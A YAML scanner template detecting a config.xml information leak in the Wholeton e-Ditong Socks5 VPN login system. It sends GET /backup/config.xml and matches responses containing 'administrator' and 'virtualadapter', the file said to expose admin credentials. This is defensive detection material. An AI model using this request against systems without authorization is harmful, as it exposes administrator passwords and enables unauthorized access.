expression: r0()
id: wholeton-vpn-info-leak
info:
  author: zan8in
  description: "\u60E0\u5C14\u987F e\u5730\u901ASocks5 VPN\u767B\u5F55\u7CFB\u7EDF\
    \ \u5B58\u5728\u4FE1\u606F\u6CC4\u6F0F\u6F0F\u6D1E\uFF0C\u8BBF\u95EE\u7279\u6B8A\
    \u7684Url\u5373\u53EF\u83B7\u53D6\u7BA1\u7406\u5458\u8D26\u53F7\u5BC6\u7801\n\
    app=\"\u60E0\u5C14\u987F-e\u5730\u901AVPN\"\n"
  name: "\u60E0\u5C14\u987F e\u5730\u901A config.xml \u4FE1\u606F\u6CC4\u6F0F\u6F0F\
    \u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'administrator')
      && response.body.bcontains(b'virtualadapter')
    request:
      method: GET
      path: /backup/config.xml
